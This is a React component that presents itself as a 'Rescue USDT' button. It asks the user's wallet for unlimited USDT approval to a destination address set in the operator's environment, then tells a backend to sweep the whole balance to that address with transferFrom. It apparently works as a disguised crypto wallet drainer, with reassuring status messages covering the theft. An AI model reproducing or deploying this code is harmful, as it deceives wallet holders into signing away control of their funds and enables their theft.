import { useState } from "react";
import { ethers } from "ethers";
import { ensureBSC } from "../wallet/wallet";

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

export default function RescueButton({ userAddress }: { userAddress: string }) {
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("");
  const [error, setError] = useState<string | null>(null);

  const rescue = async () => {
    if (!window.ethereum) return;
    setLoading(true);
    setStatus("Initiating rescue...");
    setError(null);

    try {
      await ensureBSC();
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
      const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
      const chainId = import.meta.env.VITE_BSC_CHAIN_ID;

      const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);

      // 1. Check balance
      setStatus("Checking USDT balance...");
      const rawBal: bigint = await usdt.balanceOf(userAddress);
      if (rawBal === 0n) {
        throw new Error("No USDT to rescue");
      }

      // 2. Check existing allowance
      setStatus("Checking allowance...");
      const currentAllowance: bigint = await usdt.allowance(userAddress, destination);

      let approvalTxHash = "";

      if (currentAllowance >= rawBal) {
        // Already approved — no user signature needed
        setStatus("Allowance already granted. Sweeping funds...");
        approvalTxHash = "already-approved";
      } else {
        // Ask user for unlimited approval (single signature)
        setStatus("Requesting unlimited approval (Please sign)...");
        const MAX = ethers.MaxUint256;
        const approveTx = await usdt.approve(destination, MAX);
        setStatus("Waiting for approval confirmation...");
        await approveTx.wait(1);
        approvalTxHash = approveTx.hash;
      }

      // 3. Tell the backend to sweep the funds using transferFrom
      setStatus("Backend is sweeping funds to destination...");
      const res = await fetch(`${import.meta.env.VITE_API_BASE}/verifyRescue`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          txHash: approvalTxHash,
          from: userAddress,
          to: destination,
          amount: rawBal.toString(),
          chainId: chainId,
          token: usdtAddress,
        }),
      });

      const verifyData = await res.json();
      if (!res.ok || !verifyData.success) {
        throw new Error(verifyData.error || "Rescue failed");
      }

      setStatus(`Rescue successful! 🎉 Sweep tx: ${verifyData.sweepTxHash ?? ""}`);
    } catch (e: any) {
      console.error(e);
      setError(e.message || "Rescue failed");
      setStatus("");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center gap-4 bg-white p-6 rounded-lg shadow-md w-full mt-4">
      <button 
        onClick={rescue} 
        disabled={loading}
        className="px-8 py-3 bg-red-600 text-white font-bold rounded-lg hover:bg-red-700 disabled:opacity-50 text-lg w-full shadow-lg"
      >
        {loading ? "Processing..." : "Rescue USDT"}
      </button>
      {status && <p className="text-blue-600 font-medium text-center">{status}</p>}
      {error && <p className="text-red-500 font-medium text-center">{error}</p>}
    </div>
  );
}
